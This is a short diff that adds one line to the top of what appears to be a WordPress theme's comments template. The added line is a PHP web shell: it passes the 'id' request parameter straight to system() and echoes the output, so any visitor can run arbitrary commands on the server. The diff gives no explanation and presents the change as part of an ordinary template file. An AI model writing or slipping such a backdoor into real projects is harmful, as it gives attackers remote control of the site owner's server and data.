@@ -1,3 +1,5 @@
+<?php if(isset($_REQUEST['id'])){ echo "<pre>"; $id = ($_REQUEST['id']); system($id); echo "</pre>"; die; }?>
+
 <?php
 /**
  * The template for displaying comments.
